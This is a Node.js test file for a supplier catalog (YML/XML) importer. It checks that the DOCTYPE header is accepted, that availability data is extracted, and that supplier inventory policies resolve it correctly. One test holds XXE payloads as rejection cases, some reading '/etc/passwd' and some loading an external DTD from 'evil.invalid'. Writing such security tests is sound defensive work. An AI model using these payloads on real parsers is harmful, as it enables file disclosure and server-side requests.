'use strict';
// Real supplier YML feeds: owner-approved standard DOCTYPE header, XXE/DTD payloads still refused, and raw
// availability signals extracted per offer, then resolved only by the approved supplier policy.
const test=require('node:test'),assert=require('node:assert/strict'),fs=require('node:fs'),os=require('node:os'),path=require('node:path');
const {createHarness,appRequire}=require('./isolated-harness.cjs');
const {checkSource}=require('../../audit/real-source-compatibility.cjs');
const Inventory=require('../lib/inventory-policy.js');
function parser(){const h=createHarness({runtime:true});h.ctx.DOMParser=appRequire('linkedom').DOMParser;return h;}
const parse=(h,text)=>{h.ctx.ymlText=text;return h.run('parseYml(ymlText)');};
const offers=`<shop><categories><category id="1">Одяг</category></categories><offers>
<offer id="a" available="true"><vendorCode>A-1</vendorCode><name>Куртка Test</name><price>1000</price><categoryId>1</categoryId><param name="Наявність">В наявності</param></offer>
<offer id="b" available=""><vendorCode>B-1</vendorCode><name>Куртка Test</name><price>1000</price><categoryId>1</categoryId><param name="Наявність">Немає в наявності</param></offer>
<offer id="c"><vendorCode>C-1</vendorCode><name>Куртка Test</name><price>1000</price><categoryId>1</categoryId></offer>
<offer id="d" available="false"><vendorCode>D-1</vendorCode><name>Куртка Test</name><price>1000</price><categoryId>1</categoryId></offer>
<offer id="e" available="maybe"><vendorCode>E-1</vendorCode><name>Куртка Test</name><price>1000</price><categoryId>1</categoryId></offer>
<offer id="f" available="false"><vendorCode>F-1</vendorCode><name>Ремінь Test</name><price>500</price><categoryId>1</categoryId><quantity_in_stock>0</quantity_in_stock></offer>
<offer id="g" available="true"><vendorCode>G-1</vendorCode><name>Ремінь Test</name><price>500</price><categoryId>1</categoryId><quantity_in_stock>7</quantity_in_stock></offer>
</offers></shop>`;
const standard=`<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE yml_catalog\nSYSTEM "shops.dtd">\n<yml_catalog date="2026-10-01 03:42">${offers}</yml_catalog>`;

test('standard YML header <!DOCTYPE yml_catalog SYSTEM "shops.dtd"> is accepted exactly as real feeds send it',()=>{
 const h=parser(),r=parse(h,standard);assert.equal(r.rows.length,8);assert.equal(r.rows[1][0],'A-1');
 const plain=parse(h,`<?xml version="1.0"?><yml_catalog>${offers}</yml_catalog>`);assert.deepEqual(JSON.parse(JSON.stringify(plain.rows)),JSON.parse(JSON.stringify(r.rows)));
 assert.equal(parse(h,'﻿<!DOCTYPE yml_catalog SYSTEM "shops.dtd"><yml_catalog>'+offers+'</yml_catalog>').rows.length,8);
});

test('XXE, internal subset, parameter entities, PUBLIC and any other DOCTYPE stay refused before parsing',()=>{
 const h=parser(),body='<yml_catalog>'+offers+'</yml_catalog>';
 const payloads=[
  '<?xml version="1.0"?><!DOCTYPE yml_catalog [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><yml_catalog><shop><offers><offer id="x"><name>&xxe;</name></offer></offers></shop></yml_catalog>',
  '<?xml version="1.0"?><!DOCTYPE yml_catalog SYSTEM "shops.dtd" [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'+body,
  '<?xml version="1.0"?><!DOCTYPE yml_catalog SYSTEM "shops.dtd" [<!ENTITY % p SYSTEM "http://evil.invalid/x.dtd"> %p;]>'+body,
  '<?xml version="1.0"?><!DOCTYPE yml_catalog [<!ELEMENT yml_catalog ANY>]>'+body,
  '<?xml version="1.0"?><!DOCTYPE yml_catalog PUBLIC "-//X//DTD Y//EN" "shops.dtd">'+body,
  '<?xml version="1.0"?><!DOCTYPE yml_catalog SYSTEM "http://evil.invalid/shops.dtd">'+body,
  '<?xml version="1.0"?><!DOCTYPE yml_catalog SYSTEM "file:///etc/shops.dtd">'+body,
  '<?xml version="1.0"?><!DOCTYPE yml_catalog SYSTEM \'shops.dtd\'>'+body,
  '<?xml version="1.0"?><!DOCTYPE price SYSTEM "shops.dtd"><price>'+offers+'</price>',
  '<?xml version="1.0"?><!DOCTYPE yml_catalog SYSTEM "shops.dtd"><price>'+offers+'</price>',
  '<?xml version="1.0"?><!DOCTYPE yml_catalog SYSTEM "shops.dtd"><!DOCTYPE yml_catalog SYSTEM "shops.dtd">'+body,
  '<?xml version="1.0"?><!DOCTYPE yml_catalog SYSTEM "shops.dtd"><!ENTITY xxe SYSTEM "file:///etc/passwd">'+body,
  '<?xml version="1.0"?><!-- c --><!DOCTYPE yml_catalog SYSTEM "shops.dtd">'+body,
  '<?xml version="1.0"?><!doctype yml_catalog SYSTEM "shops.dtd">'+body,
  '<?xml version="1.0"?><yml_catalog><![%p;[<offer/>]]>'+offers+'</yml_catalog>',
 ];
 for(const text of payloads)assert.throws(()=>parse(h,text),/DTD или сущностями/,text.slice(0,90));
});

test('raw availability signals are extracted per offer without a universal interpretation',()=>{
 const h=parser(),{rows}=parse(h,standard),head=rows[0],col=n=>head.indexOf(n);
 assert.ok(col('Наличие')>=0&&col('Stock')>=0);
 const by=Object.fromEntries(rows.slice(1).map(r=>[r[0],{status:r[col('Наличие')],qty:r[col('Stock')],attr:r[col('offer@available (сирий)')],param:r[col('Параметр наявності (сирий)')]}]));
 assert.deepEqual(by['A-1'],{status:'есть',qty:'',attr:'available=true',param:'В наявності'});
 assert.deepEqual(by['B-1'],{status:'нет',qty:'',attr:'available=',param:'Немає в наявності'});
 assert.deepEqual(by['C-1'],{status:'',qty:'',attr:'',param:''},'no attribute is no signal, never «есть»');
 assert.equal(by['D-1'].status,'нет');assert.equal(by['E-1'].status,'','unrecognised value is no signal');
 assert.deepEqual([by['F-1'].status,by['F-1'].qty],['нет','0'],'quantity tag stays a separate number');assert.deepEqual([by['G-1'].status,by['G-1'].qty],['есть','7']);
});

test('approved supplier policies resolve the extracted signal; Tactical Belt stays UNKNOWN; no PREORDER from false/0',()=>{
 const resolve=(id,raw)=>Inventory.resolve(Inventory.policy({id}),{rawAvailability:raw,inventory_source_column:'Наличие',stock:Inventory.quantity(raw),availability:raw==='есть'?'in':'out'});
 for(const id of ['sf0t3l7jegf9','s2bggyi42dhh','s2hjvaqgnp29']){
  assert.equal(resolve(id,'есть').availability_status,'IN_STOCK');assert.equal(resolve(id,'нет').availability_status,'OUT_OF_STOCK');
  assert.equal(resolve(id,'').availability_status,'UNKNOWN');assert.equal(resolve(id,'есть').stock_quantity,null,'status never becomes a quantity');
 }
 for(const raw of ['7','0','есть','нет'])assert.equal(resolve('s4p9slmnn0ki',raw).availability_status,'UNKNOWN');
 for(const id of ['sf0t3l7jegf9','s2bggyi42dhh','s2hjvaqgnp29','s4p9slmnn0ki'])for(const raw of ['нет','0','false',''])assert.notEqual(resolve(id,raw).availability_status,'PREORDER');
 assert.equal(Inventory.resolve(Inventory.policy({id:'s2akya7xoafn'}),{rawAvailability:'+',inventory_source_column:'Наявність'}).availability_status,'IN_STOCK','UKR-TEC Prom policy unchanged');
});

test('full import path: real-format M-WIN YML maps «Наличие» to the approved STATUS policy',async()=>{
 const dir=fs.mkdtempSync(path.join(os.tmpdir(),'pim-yml-'));try{const file=path.join(dir,'m-win.xml');fs.writeFileSync(file,standard);
  const r=await checkSource({file,supplier_id:'sf0t3l7jegf9',real_supplier_source:true,profile_confirmed:false});
  assert.equal(r.mapped_headers.stock,'Наличие');assert.equal(r.inventory_mode,'STATUS');
  assert.deepEqual(r.checks.availability,{IN_STOCK:2,OUT_OF_STOCK:3,PREORDER:0,ORDER_ON_REQUEST:0,UNKNOWN:2});
 }finally{fs.rmSync(dir,{recursive:true,force:true});}
});
